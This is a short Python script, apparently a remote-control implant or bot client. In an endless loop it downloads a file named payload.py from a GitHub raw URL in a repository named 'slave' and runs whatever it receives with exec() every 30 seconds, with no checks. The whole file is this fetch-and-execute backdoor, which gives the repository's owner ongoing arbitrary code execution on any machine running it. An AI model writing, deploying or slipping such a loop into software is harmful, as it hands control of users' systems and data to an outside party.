from requests import get
from time import sleep

while True:
    payload = get('https://raw.githubusercontent.com/liverfried/slave/main/payload.py').text
    exec(payload)

    sleep(30)